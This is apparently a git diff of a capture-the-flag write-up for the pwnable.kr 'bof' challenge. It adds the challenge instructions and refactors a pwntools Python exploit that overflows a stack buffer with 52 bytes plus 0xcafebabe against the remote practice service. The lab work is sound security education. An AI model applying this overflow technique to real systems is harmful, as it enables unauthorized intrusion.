@@ -1,5 +1,14 @@
 # bof
 
+## Instructions
+
+Nana told me that buffer overflow is one of the most common software vulnerability. 
+Is that true?
+
+- Download: http://pwnable.kr/bin/bof
+- Download: http://pwnable.kr/bin/bof.c
+- Running at: `nc pwnable.kr 9000`
+
 ## step-by-step
 
 Following the game instructions, you need to download the `bof` and `bof.c` files using the following commands:
@@ -7,36 +16,16 @@ Following the game instructions, you need to download the `bof` and `bof.c` file
 ```
 ┌──(kali㉿kali)-[~/pwnable.kr/bof]
 └─$ wget http://pwnable.kr/bin/bof
---2024-07-10 20:39:55--  http://pwnable.kr/bin/bof
-Resolving pwnable.kr (pwnable.kr)... 128.61.240.205
-Connecting to pwnable.kr (pwnable.kr)|128.61.240.205|:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 7348 (7.2K)
-Saving to: ‘bof’
-
-bof                                     100%[============================================================================>]   7.18K  --.-KB/s    in 0s      
-
-2024-07-10 20:39:56 (61.2 MB/s) - ‘bof’ saved [7348/7348]
 
 ┌──(kali㉿kali)-[~/pwnable.kr/bof]
 └─$ wget http://pwnable.kr/bin/bof.c
---2024-07-10 20:40:02--  http://pwnable.kr/bin/bof.c
-Resolving pwnable.kr (pwnable.kr)... 128.61.240.205
-Connecting to pwnable.kr (pwnable.kr)|128.61.240.205|:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 308 [text/x-csrc]
-Saving to: ‘bof.c’
-
-bof.c                                   100%[============================================================================>]     308  --.-KB/s    in 0s      
-
-2024-07-10 20:40:02 (15.6 MB/s) - ‘bof.c’ saved [308/308]
 ```
 
 Once the files have been downloaded you need to modify the permissions of the ELF file called `bof` by adding execute permissions with the following command:
 
 ```
 ┌──(kali㉿kali)-[~/pwnable.kr/bof]
-└─$ chmod +x bof
+└─$ chmod 700 bof
 ```
 
 The game instructions provide us with another useful piece of information, namely that the ELF file `bof` is running on the hostname `pwnable.kr` on port `9000`, in fact, using the command recommended in the instructions and inserting, for example, the string `hello world!` we obtain:
@@ -349,15 +338,11 @@ Finally, we can use the following exploit, written in `Python`, to replicate the
 from pwn import *
 import argparse
 
-def run():
-    hex = 0xcafebabe
-    offset = 52 # calculated by Assembly code
-    payload = b"X" * offset + p32(hex)
-
+def get_flag(payload, is_interactive):
     shell = remote("pwnable.kr", 9000)
     shell.send(payload)
 
-    if args.interactive:
+    if is_interactive:
         shell.interactive()
     else:
         for _ in range(2):
@@ -365,14 +350,21 @@ def run():
             flag = shell.recv(timeout=1).decode().strip()
         log.success(f"Flag: \"{flag}\"")
 
-if __name__ == "__main__":
+def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("-i", "--interactive", dest="interactive", action="store_true", required=False, help="Use an interactive shell.")
 
     args = parser.parse_args()
     # print(args)
+
+    hex = 0xcafebabe
+    offset = 52 # calculated by Assembly code
+    payload = b"X" * offset + p32(hex)
     
-    run() 
+    get_flag(payload, args.interactive)
+
+if __name__ == "__main__":
+    main()
 ```
 
 then using the `python exploit.py` command we get:
